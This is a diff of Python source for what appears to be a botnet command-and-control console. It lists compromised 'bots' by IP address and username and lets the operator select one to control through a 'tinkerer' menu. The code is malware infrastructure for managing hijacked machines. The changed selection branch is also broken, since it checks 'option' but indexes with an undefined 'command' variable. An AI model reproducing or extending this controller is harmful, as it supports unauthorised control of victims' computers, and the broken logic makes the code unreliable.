@@ -383,36 +383,39 @@ class BotSwitcher(cmd.Cmd):
 
     # ---------------------------------------------------------------------------------------------
     def do_SHbots(self, option):
-        """SHbots\n\tList connected bots.\n"""
-        active_bots_str = '\nActive bots:'
-        inactive_bots_str = '\n\nInactive bots:'
-        for bots_counter, bot in enumerate(connected_sockets):
-            if bot['status'] is True:
-                active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
-            else:
-                inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
-        printable_bots = active_bots_str + inactive_bots_str
-        logging(data_to_log=printable_bots, printer=True)
-
-    # ---------------------------------------------------------------------------------------------
-    def default(self, command):
+        """SHbots [option]\n\tlist: List connected bots\n\t[bot number]: Interact with target bot\n"""
         global active_bot
         global conn
-        if command.isdigit() is True:
-            try:
-                if connected_sockets[int(command)]['status'] is True:
-                    double_check = ask_input(phrase='Are you sure? yes/no\n')
-                    if double_check == 'yes':
-                        active_bot = int(command)
-                        conn = connected_sockets[int(command)]['conn']
-                        tinkerer_menu()
+        if option:
+            if option == 'list':
+                active_bots_str = '\nActive bots:'
+                inactive_bots_str = '\n\nInactive bots:'
+                for bots_counter, bot in enumerate(connected_sockets):
+                    if bot['status'] is True:
+                        active_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
                     else:
-                        logging(data_to_log='Selection canceled\n', printer=True)
-            except Exception as exception_default:
-                if str(exception_default) == 'list index out of range':
-                    logging(data_to_log='The selected bot does not exist\n', printer=True)
-                else:
-                    logging(data_to_log=str(exception_default), printer=True)
+                        inactive_bots_str += '\n\tBot # {}\t\t{}\t{}'.format(bots_counter, bot['ip'], bot['username'])
+                printable_bots = active_bots_str + inactive_bots_str + '\n\n\nYou can interact with a bot by entering its number #'
+                logging(data_to_log=printable_bots, printer=True)
+            elif option.isdigit() is True:
+                try:
+                    if connected_sockets[int(command)]['status'] is True:
+                        double_check = ask_input(phrase='Are you sure? yes/no\n')
+                        if double_check == 'yes':
+                            active_bot = int(command)
+                            conn = connected_sockets[int(command)]['conn']
+                            tinkerer_menu()
+                        else:
+                            logging(data_to_log='Selection canceled\n', printer=True)
+                except Exception as exception_default:
+                    if str(exception_default) == 'list index out of range':
+                        logging(data_to_log='The selected bot does not exist\n', printer=True)
+                    else:
+                        logging(data_to_log=str(exception_default), printer=True)
+            else:
+                print('Aborted: unknown option\n')
+        else:
+            print('Aborted: an option is required\n')
 
     # ---------------------------------------------------------------------------------------------
     def do_SHquit(self, option) -> bool:
